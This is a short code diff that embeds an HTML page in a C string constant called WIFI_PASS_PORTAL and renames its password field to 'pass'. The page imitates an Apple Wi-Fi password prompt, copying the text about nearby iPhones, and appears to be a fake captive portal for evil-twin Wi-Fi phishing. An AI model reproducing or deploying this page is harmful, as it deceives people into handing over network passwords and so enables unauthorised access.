@@ -1,3 +1,4 @@
+const char WIFI_PASS_PORTAL[] = R"=====(
 <html>
 <head>
       <title>Enter the password for </title>
@@ -106,7 +107,7 @@ font-weight: bold;
 <div  style="padding: 10px;">
   <div class="input_container">
     <span style="font-size:20px;">Password</span>
-    <input type='password' name='user' required focus id="myInput" />
+    <input type='password' name='pass' required focus id="myInput" />
   </div>
   <div style="padding: 10px;">
     <p style="color:#9898a0;font-size:20px;">You can also access this Wi-Fi network by bringing you Iphone near any Iphone, Ipad, or Mac which has connected to this network and has you in ther contacts.</p>
@@ -121,3 +122,4 @@ font-weight: bold;
 </script>
 </body>
 </html>
+)=====";
